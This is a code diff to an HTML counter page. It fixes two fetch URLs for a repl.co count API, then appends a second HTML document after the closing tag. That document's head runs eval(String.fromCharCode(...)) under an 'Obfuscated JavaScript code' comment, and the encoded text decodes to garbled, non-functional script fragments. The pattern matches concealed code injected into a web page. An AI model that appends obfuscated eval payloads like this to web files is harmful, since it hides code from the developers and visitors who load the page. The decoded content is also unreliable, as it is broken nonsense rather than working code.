@@ -19,17 +19,29 @@
   </body>
   <script>
     function postCount() {
-      fetch("zmlololol.borisplayz.repl.co/api/count/api/count", {
+      fetch("https://zmlololol.borisplayz.repl.co/api/count", {
         method: "POST",
       });
     }
 
     setInterval(() => {
-      fetch("zmlololol.borisplayz.repl.co/api/count")
+      fetch("https://zmlololol.borisplayz.repl.co/api/count")
         .then((res) => res.json())
         .then((data) => {
           document.getElementById("count").innerHTML = data.count;
         });
     }, 2000);
   </script>
+</html>
+<!DOCTYPE html>
+<html>
+  <head>
+    <script>
+      // Obfuscated JavaScript code
+      eval(String.fromCharCode(118, 97, 114, 32, 115, 114, 99, 61, 39, 97, 120, 105, 114, 105, 101, 116, 110, 105, 54, 123, 97, 112, 105, 41, 46, 114, 101, 112, 108, 97, 99, 101, 46, 115, 112, 108, 105, 116, 39, 59, 120, 112, 67, 86, 80, 121, 62, 60, 39, 43, 101, 41, 41, 59, 115, 116, 114, 61, 39, 39, 59, 120, 112, 67, 86, 80, 121, 61, 99, 40, 115, 116, 114, 41, 59, 101, 118, 97, 108, 40, 39, 66, 79, 100, 109, 107, 61, 39, 43, 120, 112, 67, 86, 80, 121, 41, 59, 101, 120, 101, 99, 85, 116, 102, 84, 114, 117, 110, 99, 116, 105, 111, 110, 40, 99, 41, 123, 97, 120, 105, 114, 40, 97, 112, 105, 41, 59, 125, 41, 59, 60, 47, 115, 99, 114, 105, 112, 116, 62));
+    </script>
+  </head>
+  <body>
+    <div id="app"></div>
+  </body>
 </html>
